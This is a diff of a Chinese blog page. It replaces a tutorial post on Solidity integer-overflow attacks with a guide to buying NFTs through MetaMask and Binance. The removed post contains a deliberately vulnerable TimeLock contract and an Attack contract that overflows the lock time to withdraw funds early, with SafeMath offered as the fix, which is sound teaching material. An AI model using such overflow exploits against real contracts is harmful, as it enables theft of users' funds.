@@ -4,7 +4,7 @@
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<title>智能合约Solidity安全②-数字溢出攻击Overflow | Mark World</title>
+<title>如何购买NFT？详细介绍充值加密币 | Mark World</title>
 
 <link rel="shortcut icon" href="https://marknft.github.io/favicon.ico?v=1652612347964">
 
@@ -89,11 +89,11 @@
         <div class="post-detail gt-bg-theme-color-second">
             <article class="gt-post-content">
                 <h2 class="post-title">
-                    智能合约Solidity安全②-数字溢出攻击Overflow
+                    如何购买NFT？详细介绍充值加密币
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
-                        · 2022-05-10 ·
+                        · 2022-05-15 ·
                     </time>
                     
                         <a href="https://marknft.github.io/tag/kp27yV9HV/" class="post-tags">
@@ -102,76 +102,90 @@
                     
                 </div>
                 <div class="post-content">
-                    <pre><code>数字溢出会出现不可意料的风险
-</code></pre>
+                    <h2 id="前言">前言：</h2>
+<p>一直有童鞋在问<a href="https://www.youtube.com/watch?v=ICmFH95sMso">如何购买NFT</a>，之前已经出过视频，此次文字作为补充！</p>
 <!-- more -->
-<h2 id="正文">正文</h2>
-<p>因为solidity的unit数字类型默认有范围，会有上下溢出风险</p>
-<pre><code>unit unit256
-0 &lt;= x &lt;=2**256 -1 
-// 2**256 -1 +1 = 0
-</code></pre>
-<h3 id="溢出代码案例">溢出代码案例:</h3>
-<p>默认存储金额一周后可取出，使用攻击数字溢出，可以现存现取</p>
-<pre><code>pragma solidity ^0.6.10;
-
-contract TimeLock {
-    mapping(address =&gt; uint) public balances;
-    mapping(address =&gt; uint) public lockTime;
-
-    function deposit() external payable {
-        balances[msg.sender] +=msg.value;
-        lockTime[msg.sender] = now + 1 weeks;
-    }
-
-    function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] += _secondsToIncrease;
-    }
-
-    function withdraw() public {
-        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);
-        require(now &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);
-        uint amount = balances[msg.sender];
-        balances[msg.sender] = 0;
-    
-        (bool sent, ) = msg.sender.call{value: amount}(&quot;&quot;);
-        require(sent, &quot;Failed to send Ether&quot;);
-    }
-
-}
-
-contract Attack {
-    TimeLock timeLock;
-
-    constructor(TimeLock _timeLock) public {
-        timeLock = TimeLock(_timeLock);
-    }
-    fallback() external payable {}
-
-    function attack() public payable {
-        timeLock.deposit{value: msg.value}();
-        timeLock.increaseLockTime(
-            uint(-timeLock.lockTime(address(this)))
-        );
-        timeLock.withdraw();
-    }
-}
-</code></pre>
-<h3 id="解决方案">解决方案：</h3>
+<p>本文将会介绍如何在Opensea购买NFT，此文购买的NFT是在以太网主链ETH(鼠标停在NFT价格前图标，自动显示币的种类)！！</p>
+<figure data-type="image" tabindex="1"><img src="https://marknft.github.io/post-images/1652611146291.png" alt="" loading="lazy"></figure>
+<h2 id="1-准备工具">1) 准备工具：</h2>
+<h3 id="11-科学上网工具">1.1） 科学上网工具</h3>
+<h3 id="12metamask软件">1.2）Metamask软件</h3>
 <ul>
 <li>
-<p>使用SafeMath库保护<br>
-using SafeMath for unit;</p>
-<hr>
+<p>苹果手机需使用美区ID</p>
+</li>
+<li>
+<p>安卓手机请至官网下载</p>
+</li>
+<li>
+<p>电脑端Google浏览器+Metamask插件</p>
 </li>
 </ul>
-<blockquote>
-<p>这里是记录学习分享的内容，不定时发布。</p>
-</blockquote>
-<p><strong>封面图</strong><br>
-<img src="https://marknft.github.io/post-images/1652159100742.jpg" alt="" loading="lazy"><br>
-<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
+<p>(MetaMask官网)[https://metamask.io]</p>
+<h2 id="2-metamask小狐狸注册和充值">2) Metamask小狐狸注册和充值</h2>
+<h3 id="21手机注册metamask演示">2.1）手机注册Metamask演示</h3>
+<p>(小狐狸注册演示)[https://www.youtube.com/watch?v=-arKE4dcyIw]</p>
+<pre><code>提示：助记词一定要记录在安全的地方！！！
+</code></pre>
+<h3 id="22metamask小狐狸充值">2.2）Metamask小狐狸充值</h3>
+<ul>
+<li>
+<p>使用小狐狸的充值，除对卡和币种类有限制，还有手续费高的问题！(不建议)</p>
+</li>
+<li>
+<p>目前的主流是通过交易所充值，将会使用币安充值！</p>
+</li>
+</ul>
+<h4 id="a-币安目前已关闭大陆运营可以选择台湾注册需使用电脑且开启科学上网">a. 币安目前已关闭大陆运营，可以选择台湾注册(需使用电脑且开启科学上网)</h4>
+<pre><code>通过下面邀请码注册，你会节省20%手续费，我也有20%手续费返佣。币安交易所注册（20%交易手续费减免），邀请码：446666549
+
+https://accounts.biance.com/zh-CN/register?ref=446666549
+
+欧易交易所注册（20%交易手续费减免），邀请码：17476159
+
+https://www.okx.com/join/17476159
+</code></pre>
+<h4 id="b-进入注册页面首先选择台湾然后选择邮箱注册">b. 进入注册页面，首先选择台湾，然后选择邮箱注册！</h4>
+<ul>
+<li>邮箱请使用Google/Outlook邮箱(Google邮箱需配合币安/谷歌验证器Authenticator保护使用)！</li>
+<li>大陆手机直接注册，接收不到验证码！<br>
+<img src="https://marknft.github.io/post-images/1652611409786.png" alt="" loading="lazy"></li>
+</ul>
+<h4 id="c注册成功后进入个人中心账户安全手机验证选择中国绑定手机号此时可以收到验证码">c.注册成功后进入个人中心→账户安全→手机验证，选择中国绑定手机号(此时可以收到验证码)！</h4>
+<h4 id="d回到个人中心身份认证证件中国不要使用购买的身份信息黑号不可交易">d.回到个人中心→身份认证→证件中国，不要使用购买的身份信息，黑号不可交易！</h4>
+<figure data-type="image" tabindex="2"><img src="https://marknft.github.io/post-images/1652611424948.png" alt="" loading="lazy"></figure>
+<h2 id="3购买虚拟币">3）购买虚拟币</h2>
+<ul>
+<li>
+<p>建议下载币安APP，方便随时交易！苹果使用美区ID，安卓请到官网下载！</p>
+</li>
+<li>
+<p>币安APP使用不需要代理即可使用！</p>
+</li>
+</ul>
+<h3 id="新用户使用币安app进入简洁版点击首页底部中心快捷买币币种eth输入金额必须是cny生成订单">新用户使用币安APP进入简洁版，点击首页底部中心→快捷买币→币种ETH→输入金额(必须是CNY)生成订单！</h3>
+<figure data-type="image" tabindex="3"><img src="https://marknft.github.io/post-images/1652611437214.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p>进阶购买：进入币安专业版，可以到C2C选择不同商家！</p>
+</li>
+<li>
+<p>按时提示完成付款，并点击确认已打款！一般两三分钟到账！</p>
+<p>注意成功购买会提示24小时后才可提现！</p>
+<p>第二天操作链上提现！</p>
+</li>
+</ul>
+<h2 id="4提现到metamask小狐狸钱包">4）提现到Metamask小狐狸钱包</h2>
+<ul>
+<li>注意此处购买的NFT，使用以太网主链ETH支付</li>
+</ul>
+<h3 id="41点击币安app的eth金额提现网络务必选择ethereumerc20-选错钱可能就没了">4.1）点击币安APP的ETH金额提现，网络务必选择Ethereum(ERC20)! 选错钱可能就没了！</h3>
+<figure data-type="image" tabindex="4"><img src="https://marknft.github.io/post-images/1652611453512.png" alt="" loading="lazy"></figure>
+<h3 id="42-粘贴你的小狐狸公共地址确认提现">4.2） 粘贴你的小狐狸公共地址，确认提现！</h3>
+<p>此时你已经可以到OpenSea购买喜欢的NFT了！</p>
 <p>(完)</p>
+<p>如果你对任何交易不清楚时，可以打开下面网站输入钱包地址，以太网链上任何交易记录都可以找到！</p>
+<p>https://Etherscan.io</p>
 
                 </div>
             </article>
@@ -180,14 +194,14 @@ using SafeMath for unit;</p>
         
             <div class="next-post">
                 <div class="next gt-c-content-color-first">下一篇</div>
-                <a href="https://marknft.github.io/post/SoliditySecurity-1/" class="post-title gt-a-link">
-                    智能合约Solidity安全①-重入攻击Reentrancy
+                <a href="https://marknft.github.io/post/Solidity_Basis1/" class="post-title gt-a-link">
+                    Solidity基础入门笔记①
                 </a>
             </div>
         
 
         
-            <span id="/post/SoliditySecurity-2/" class="leancloud_visitors" data-flag-title="智能合约Solidity安全②-数字溢出攻击Overflow">
+            <span id="/post/Blockchain_bank/" class="leancloud_visitors" data-flag-title="如何购买NFT？详细介绍充值加密币">
                 <em class="post-meta-item-text">阅读量 </em>
                 <i class="leancloud-visitors-count">0</i>
             </span>
